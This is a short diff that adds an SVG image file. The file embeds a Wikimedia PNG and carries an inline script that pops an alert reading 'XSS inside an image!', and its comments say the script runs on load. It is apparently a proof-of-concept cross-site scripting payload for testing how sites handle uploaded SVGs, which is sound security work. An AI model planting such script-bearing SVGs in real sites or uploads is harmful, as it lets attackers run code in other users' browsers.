@@ -1,0 +1,16 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300">
+  
+  <!-- This is a real image inside the SVG -->
+  <image xlink:href="https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png"
+         x="0" y="0" height="300px" width="300px"/>
+
+  <!-- This script will execute when the SVG is loaded -->
+  <script>
+    alert('XSS inside an image!');
+  </script>
+
+</svg>
